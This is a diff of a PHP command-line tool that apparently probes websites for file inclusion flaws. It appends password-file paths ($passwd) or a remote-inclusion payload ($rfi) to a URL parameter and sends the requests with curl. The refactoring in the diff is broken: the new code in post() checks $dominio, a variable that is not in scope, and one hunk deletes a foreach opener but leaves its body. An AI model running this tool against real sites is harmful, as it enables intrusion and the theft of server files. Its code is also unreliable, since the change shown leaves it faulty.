@@ -49,11 +49,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 
 	  case "d":
 	  $dominio = $opts["d"];
-	  if(preg_match("@http://@", $dominio)) {
-	  	 $dominio = $dominio;
-	  } else {
-	  	$dominio = "http://".$dominio;
-	  }
 	  $valor = strpos($dominio, "=");
 	  $xpt = substr($dominio, 0, $valor);
 	  foreach($passwd as $passwd1) {
@@ -67,11 +62,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $lista = file_get_contents($opts["l"], "r");
 	  $x = array_filter(explode("\n", $lista));
 	  foreach($x as $dominio) {
-	  	  if(preg_match("@http://@", $dominio)) {
-	  	  	$dominio = $dominio;
-	  	  } else {
-	  	  	$dominio = "http://".$dominio;
-	  	  }
 	  	  $valor = strpos($dominio, "=");
 	  	  $xpt = substr($dominio, 0, $valor);
 	  	  foreach($passwd as $passwd1) {
@@ -86,11 +76,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 
 	   case "r";
 	  $dominio = $opts["r"];
-	  if(preg_match("@http://@", $dominio)) {
-	  	 $dominio = $dominio;
-	  } else {
-	  	$dominio = "http://".$dominio;
-	  }
 	  $valor = strpos($dominio, "=");
 	  $xpt = substr($dominio, 0, $valor);
 	  $domain = $xpt."=".$rfi;
@@ -101,12 +86,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  case "i":
 	  $lista = file_get_contents($opts["i"], "r");
 	  $x = array_filter(explode("\n", $lista));
-	  foreach($x as $dominio) {
-	  	  if(preg_match("@http://@", $dominio)) {
-	  	  	$dominio = $dominio;
-	  	  } else {
-	  	  	$dominio = "http://".$dominio;
-	  	  }
 	  	  $valor = strpos($dominio, "=");
 	  	  $xpt = substr($dominio, 0, $valor);
 	  	  $domain = $xpt. "=".$rfi;
@@ -118,6 +97,11 @@ foreach(array_keys($opts) as $opt) switch($opt) {
  }
 
     function post($domain) {
+    if(preg_match("@http://@", $dominio)) {
+	  	 $dominio = $dominio;
+	  } else {
+	  	$dominio = "http://".$dominio;
+      }
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $domain);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
